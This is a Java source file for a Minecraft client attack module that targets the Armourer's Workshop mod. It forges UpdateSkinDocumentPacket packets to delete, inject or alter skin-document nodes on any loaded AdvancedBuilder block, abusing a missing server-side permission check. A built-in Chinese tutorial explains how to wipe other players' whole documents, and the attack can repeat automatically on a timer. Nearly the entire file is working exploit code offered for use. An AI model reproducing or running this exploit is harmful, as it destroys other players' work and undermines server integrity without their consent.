package com.redblue.red.modules.armourersworkshop;

import com.redblue.red.core.AttackModule;
import com.redblue.red.core.config.ConfigParam;
import com.redblue.red.util.PacketForge;
import net.minecraft.client.Minecraft;
import net.minecraft.core.BlockPos;
import net.minecraft.nbt.CompoundTag;
import net.minecraft.resources.ResourceLocation;
import net.minecraftforge.fml.ModList;

import java.util.List;

/**
 * AW04: UpdateSkinDocumentPacket (ID 96) - Remote document manipulation.
 *
 * Server only checks instanceof SkinDocumentProvider, no distance/container/permission.
 * Can delete nodes, insert nodes, change type, update settings on any loaded
 * AdvancedBuilder block entity.
 *
 * Wire format (after 4-byte packetId=96):
 *   writeBlockPos(pos)
 *   writeUtf(operator)
 *   writeEnum(Mode)  [ordinals: CHANGE_TYPE=0, UPDATE_SETTINGS=1, UPDATE_PROPERTIES=2,
 *                      INSERT_NODE=3, UPDATE_NODE=4, REMOVE_NODE=5, MOVE_NODE=6]
 *   action-specific payload
 */
public class AW04_SkinDocumentDestroy implements AttackModule {

    private static final ResourceLocation CHANNEL =
            new ResourceLocation("armourers_workshop", "aw-channel");
    private static final int PACKET_ID = 96;

    private final List<ConfigParam> params = List.of(
        ConfigParam.ofBool("enabled", "启用", false),
        ConfigParam.ofBlock("target_block", "目标高级构建器方块"),
        ConfigParam.ofEnum("action", "操作",
                "REMOVE_NODE", "REMOVE_NODE", "INSERT_NODE",
                "CHANGE_TYPE", "UPDATE_SETTINGS"),
        ConfigParam.ofString("node_id", "节点ID (用于删除/插入)", "root")
                .visibleWhen("action", "REMOVE_NODE", "INSERT_NODE"),
        ConfigParam.ofString("type_name", "文档类型名称", "armourers_workshop:head")
                .visibleWhen("action", "CHANGE_TYPE"),
        ConfigParam.ofInt("interval", "自动间隔 (tick)", 20, 1, 200)
    );

    private long lastTick = 0;

    @Override public String id() { return "aw04_skin_document_destroy"; }
    @Override public String name() { return "皮肤文档销毁"; }
    @Override public String description() {
        return "远程删除其他玩家的皮肤文档数据";
    }

    @Override
    public String getTutorial() {
        return "[使用方法]\n"
            + "1. 设置目标方块为高级构建器(AdvancedBuilder)的坐标\n"
            + "2. 选择操作: REMOVE_NODE(删除节点)、INSERT_NODE(插入节点)、CHANGE_TYPE(更改类型)、UPDATE_SETTINGS(更新设置)\n"
            + "3. 配置对应参数后执行\n\n"
            + "[参数说明]\n"
            + "节点ID: 要操作的节点标识，使用'root'可销毁整个文档\n"
            + "文档类型名称: CHANGE_TYPE模式下的目标类型\n"
            + "自动间隔: 自动执行的tick间隔\n\n"
            + "[注意事项]\n"
            + "服务端无距离、容器或权限校验。";
    }

    @Override
    public boolean isAvailable() {
        return ModList.get().isLoaded("armourers_workshop");
    }

    @Override
    public List<ConfigParam> getConfigParams() { return params; }

    @Override
    public void execute(Minecraft mc) { doAttack(mc); }

    @Override
    public void tick(Minecraft mc) {
        if (mc.player == null || mc.level == null) return;
        int interval = getParam("interval").map(ConfigParam::getInt).orElse(20);
        long now = mc.level.getGameTime();
        if (now - lastTick < interval) return;
        lastTick = now;
        doAttack(mc);
    }

    private void doAttack(Minecraft mc) {
        if (mc.player == null || mc.level == null) return;
        long blockLong = getParam("target_block").map(ConfigParam::getLong).orElse(0L);
        if (blockLong == 0) return;
        BlockPos pos = BlockPos.of(blockLong);

        String action = getParam("action").map(ConfigParam::getString).orElse("REMOVE_NODE");
        switch (action) {
            case "REMOVE_NODE" -> sendRemoveNode(pos);
            case "INSERT_NODE" -> sendInsertNode(pos);
            case "CHANGE_TYPE" -> sendChangeType(pos);
            case "UPDATE_SETTINGS" -> sendUpdateSettings(pos);
        }
    }

    private void sendRemoveNode(BlockPos pos) {
        String nodeId = getParam("node_id").map(ConfigParam::getString).orElse("root");
        PacketForge.send(CHANNEL, buf -> {
            buf.writeInt(PACKET_ID);
            buf.writeBlockPos(pos);
            buf.writeUtf("");           // operator
            buf.writeVarInt(5);         // Mode.REMOVE_NODE ordinal=5
            buf.writeUtf(nodeId);       // RemoveNodeAction: id
        });
    }

    private void sendInsertNode(BlockPos pos) {
        String nodeId = getParam("node_id").map(ConfigParam::getString).orElse("root");
        CompoundTag tag = new CompoundTag();
        tag.putString("Name", "injected");

        PacketForge.send(CHANNEL, buf -> {
            buf.writeInt(PACKET_ID);
            buf.writeBlockPos(pos);
            buf.writeUtf("");
            buf.writeVarInt(3);         // Mode.INSERT_NODE ordinal=3
            buf.writeUtf(nodeId);       // InsertNodeAction: id (parent)
            buf.writeInt(0);            // targetIndex
            buf.writeNbt(tag);          // node tag
        });
    }

    private void sendChangeType(BlockPos pos) {
        String typeName = getParam("type_name").map(ConfigParam::getString)
                .orElse("armourers_workshop:head");
        PacketForge.send(CHANNEL, buf -> {
            buf.writeInt(PACKET_ID);
            buf.writeBlockPos(pos);
            buf.writeUtf("");
            buf.writeVarInt(0);         // Mode.CHANGE_TYPE ordinal=0
            buf.writeUtf(typeName);     // ChangeTypeAction: type name
        });
    }

    private void sendUpdateSettings(BlockPos pos) {
        CompoundTag emptyTag = new CompoundTag();
        PacketForge.send(CHANNEL, buf -> {
            buf.writeInt(PACKET_ID);
            buf.writeBlockPos(pos);
            buf.writeUtf("");
            buf.writeVarInt(1);         // Mode.UPDATE_SETTINGS ordinal=1
            buf.writeNbt(emptyTag);     // UpdateSettingsAction: tag
        });
    }
}
